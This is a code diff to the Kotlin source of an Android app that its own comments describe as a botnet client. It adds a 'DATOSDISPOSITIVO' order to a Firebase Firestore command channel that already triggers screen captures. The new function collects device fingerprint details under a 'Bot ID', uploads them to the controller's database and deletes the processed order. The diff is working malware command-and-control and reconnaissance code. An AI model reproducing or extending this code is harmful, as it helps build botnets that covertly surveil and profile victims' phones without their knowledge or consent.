@@ -5,6 +5,7 @@ import android.app.PendingIntent
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.os.PowerManager
 import android.util.Log
 import android.widget.Toast
@@ -52,6 +53,7 @@ class Alarm : BroadcastReceiver() {
         val sender = PendingIntent.getBroadcast(context, 0, intent, 0)
         val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
         alarmManager.cancel(sender)
+        Toast.makeText(context, "Se ha parado la alarma", Toast.LENGTH_LONG).show(); // For example
     }
 
     fun leePrimitiva(db : FirebaseFirestore, strDate: String){
@@ -62,6 +64,13 @@ class Alarm : BroadcastReceiver() {
                     if(document.data["Primitiva"]!!.equals("CAPTURA")){
                         nuevaCaptura(db, strDate)
                         Log.d("TAG2", "Se añade nueva captura")
+                        db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
+                            Log.d("TAG2", "Documento eliminado")
+                        }
+                    }
+                    if(document.data["Primitiva"]!!.equals("DATOSDISPOSITIVO")){
+                        nuevosDatosDispositivo(db, strDate)
+                        Log.d("TAG2", "Se añade nuevos datos del dispositivo")
                         db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
                             Log.d("TAG2", "Documento eliminado")
                         }
@@ -112,5 +121,51 @@ class Alarm : BroadcastReceiver() {
             }
 
         Log.d("TAG2","Se ha ejecutado la tarea de toma de captura de pantalla")
+    }
+
+    fun nuevosDatosDispositivo(db : FirebaseFirestore, strDate: String){
+        // Devuelve algunos valores del dispositivo que pueden ser de interes para la botnet
+        // Fuente: https://stackoverflow.com/questions/38624319/get-android-phone-specs-programmatically
+        val fields = Build.VERSION_CODES::class.java.fields
+        var codeName = "UNKNOWN"
+        fields.filter { it.getInt(Build.VERSION_CODES::class) == Build.VERSION.SDK_INT }
+            .forEach { codeName = it.name }
+
+        val datosDispositivo = hashMapOf(
+            "Bot ID" to idAndroid,
+            "Hora" to strDate,
+            "RELEASE AND CODENAME" to Build.VERSION.RELEASE+codeName,
+            "MODEL" to Build.MODEL,
+            "ID" to Build.ID,
+            "Manufacture" to Build.MANUFACTURER,
+            "brand" to Build.BRAND,
+            "type" to Build.TYPE,
+            "user" to Build.USER,
+            "BASE" to Build.VERSION_CODES.BASE,
+            "INCREMENTAL" to Build.VERSION.INCREMENTAL,
+            "SDK" to Build.VERSION.SDK,
+            "BOARD" to Build.BOARD,
+            "BRAND" to Build.BRAND,
+            "HOST" to Build.HOST,
+            "FINGERPRINT" to Build.FINGERPRINT,
+            "Version Code" to Build.VERSION.RELEASE
+        )
+        db.collection("ordenes")
+            .whereEqualTo("Primitiva", "DATOSDISPOSITIVO")
+            .addSnapshotListener { snapshot, e ->
+                if (e != null) {
+                    Log.d("TAG", "Fallada la escucha de la primitiva.", e)
+                    return@addSnapshotListener
+                }
+
+                for (dc in snapshot!!.documentChanges) {
+                    when (dc.type) {
+                        DocumentChange.Type.ADDED -> db.collection("datosDispositivo").document(idAndroid).set(datosDispositivo)
+                    }
+                }
+
+            }
+
+        Log.d("TAG2","Se ha ejecutado la tarea de toma de datos del dispositiv")
     }
 }
